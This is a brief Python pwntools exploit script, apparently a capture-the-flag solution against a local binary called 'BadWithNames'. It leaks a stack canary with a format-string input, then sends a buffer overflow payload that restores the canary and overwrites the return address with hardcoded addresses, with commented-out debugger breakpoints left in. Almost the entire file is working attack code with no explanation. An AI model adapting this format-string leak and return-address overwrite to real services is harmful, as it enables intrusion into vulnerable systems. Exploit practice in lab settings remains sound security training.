from pwn import *

#p = process("./BadWithNames")
p = remote("127.0.0.1", 1337)
#gdb.attach(p, 
#'''b * vuln + 155
#b * vuln + 249
#b * vuln + 222
#''')
print(p.recvuntil(":").decode())

#p.sendline(b'%p.' * 32)
p.sendline(b'%19$p')

well = print(p.recvline().decode())
canary = p.recv(18).strip()
print(canary)

payload = b'A'*104 + p64(int(canary, 16)) + b'A' * 8+ p64(0x401216) + p64(0x401343)

p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())